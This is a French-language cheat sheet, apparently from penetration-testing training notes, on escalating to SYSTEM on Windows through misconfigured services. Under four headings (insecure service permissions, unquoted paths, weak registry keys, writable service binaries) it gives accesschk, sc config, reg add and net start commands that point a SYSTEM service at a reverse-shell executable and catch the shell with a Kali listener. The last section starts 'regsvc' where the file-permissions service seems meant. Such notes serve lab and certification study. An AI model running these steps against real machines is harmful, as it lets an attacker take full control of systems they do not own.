# Exploits de service

## Autorisations de service non sécurisées
Utilisez `accesschk.exe` pour vérifier les permissions d'un compte sur un service:
```sh
accesschk.exe /accepteula -uwcqv {user_name} {service_name}
# if SERVICE_CHANGE_CONFIG is enable
```

Interrogez un service et et notez qu'il s'exécute avec les privilèges SYSTEM (SERVICE_START_NAME)
```sh
sc qc {service_name}
# if 'LocalSystem' then is a SYSTEM privilege
```

Modifiez la configuration d'un service et définissez le BINARY_PATH_NAME (binpath) sur l'exécutable `rshell.exe`
```sh
sc config {service_name} binpath="\"C:\temp\rshell.exe\""
```

Démarrez un écouteur sur Kali, puis démarrez le service pour générer un shell inversé s'exécutant avec les privilèges
```sh
net start {service_name}
````

## Chemin de service non cité
Apres avoir interrogez le service   et voir ses privilèges (SERVICE_START_NAME), 
Notez que le BINARY_PATH_NAME n'est pas entre guillemets et contient des espaces.
À l'aide de `accesschk.exe`, notez que le groupe BUILTIN\Users est autorisé à `écrire` dans le répertoire.
```sh
# folder = C:\Program Files\Unquoted Path Service\
accesschk.exe /accepteula -uwdq "{folder}"
# check: RW BUILTIN\Users
```

Copiez l'exécutable rshell.exe dans ce répertoire et renommez-le en `folder_name.exe`
Démarrez un écouteur sur Kali, puis démarrez le service pour générer un shell inversé s'exécutant avec les privilèges
```sh
net start {service_name}
````

## Autorisations de registre faibles
Apres avoir interrogez le service   et voir ses privilèges (SERVICE_START_NAME), 
En utilisant `accesschk.exe`, notez que l'entrée de registre pour le service `regsvc` est accessible en écriture par le groupe "NT AUTHORITY\INTERACTIVE" (essentiellement tous les utilisateurs connectés
```sh
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
# check: RW NT AUTHORITY\INTERACTIVE
```

Remplacez la clé de registre ImagePath pour pointer vers l'exécutable rshell.exe
```sh
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\temp\rshell.exe /f
```

Démarrez un écouteur sur Kali, puis démarrez le service pour générer un shell inversé s'exécutant avec les privilèges
```sh
net start regsvc
```

## Exécutables de service non sécurisés
Apres avoir interrogez le service   et voir ses privilèges (SERVICE_START_NAME),
En utilisant `accesschk.exe`, notez que le fichier binaire du service (BINARY_PATH_NAME) est accessible en écriture par tout le monde
```sh
# path = C:\Program Files\File Permissions Service\filepermservice.exe
accesschk.exe /accepteula -quvw "{path}"
# check: RW BUILTIN\Users 
# 			FILE_ALL_ACCESS
```

Copiez l'exécutable reverse.exe que vous avez créé et remplacez le par celui-ci:
```sh
copy C:\temp\rshell.exe "{path}" /Y
```

Démarrez un écouteur sur Kali, puis démarrez le service pour générer un shell inversé s'exécutant avec les privilèges
```sh
net start regsvc
```